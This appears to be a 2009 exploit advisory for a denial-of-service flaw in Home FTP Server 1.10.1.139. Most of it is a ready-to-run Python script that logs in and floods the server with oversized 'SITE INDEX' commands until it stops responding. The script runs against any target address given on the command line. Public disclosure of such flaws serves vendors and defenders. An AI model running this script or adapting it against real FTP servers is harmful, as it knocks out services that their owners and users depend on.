# Exploit Title: Home FTP Server 1.10.1.139 'SITE INDEX' Command Remote Denial of Service Vulnerability
# Date: 16 Nov 09
# Author: zhangmc
# Software Link: http://downstairs.dnsalias.net/files/HomeFtpServerInstall.exe
# Version: Home FTP Server 1.10.1.139
# Tested on: [relevant os]
# Code :

From: zhangmc () mail ustc edu cn
Date: 16 Nov 2009 15:37:20 -0000

Date of Discovery: 16-Nov-2009

Credits:zhangmc[at]mail.ustc.edu.cn

Vendor: Ari Pikivirta
       http://downstairs.dnsalias.net/homeftpserver.html

Affected:
Home FTP Server 1.10.1.139
Earlier versions may also be affected

Overview:
Home FTP Server FTP Server is an easy use FTP server Application. Denial of service

vulnerability exists in Home FTP Server that causes the application to stop service when we

send multiple irregular "SITE INDEX" commands to the server.

Details:
If you could log on the server successfully, take the following steps and the application

will stop service:

1.sock.connect((hostname, 21))
2.sock.send("user %s\r\n" %username)
3.sock.send("pass %s\r\n" %passwd)
4.for i in range(1,20):
        sock.send("SITE INDEX "+ "a"*30*i +"\r\n")
5.sock.close()


Severity:
High

Exploit example:

#!/usr/bin/python
import socket
import sys

def Usage():
   print ("Usage:  ./expl.py <serv_ip>      <Username> <password>\n")
   print ("Example:./expl.py 192.168.48.183 anonymous anonymous\n")
if len(sys.argv) <> 4:
       Usage()
       sys.exit(1)
else:
   hostname=sys.argv[1]
   username=sys.argv[2]
   passwd=sys.argv[3]
   test_string="a"*30
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   for i in range(1,30):
       try:
           sock.connect((hostname, 21))
       except:
           print ("Connection error!")
           sys.exit(1)
       r=sock.recv(1024)
       print "[+] "+ r
       sock.send("user %s\r\n" %username)
       print "[-] "+ ("user %s\r\n" %username)
       r=sock.recv(1024)
       print "[+] "+ r
       sock.send("pass %s\r\n" %passwd)
       print "[-] "+ ("pass %s\r\n" %passwd)
       r=sock.recv(1024)
       print "[+] "+ r


       for i in range(1,20):
           sock.send("SITE INDEX "+ test_string*i +"\r\n")
           print "[-] "+ ("SITE INDEX "+ test_string +"\r\n")
           r=sock.recv(1024)
           print "[+] "+ r

       sock.close()
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


   sys.exit(0);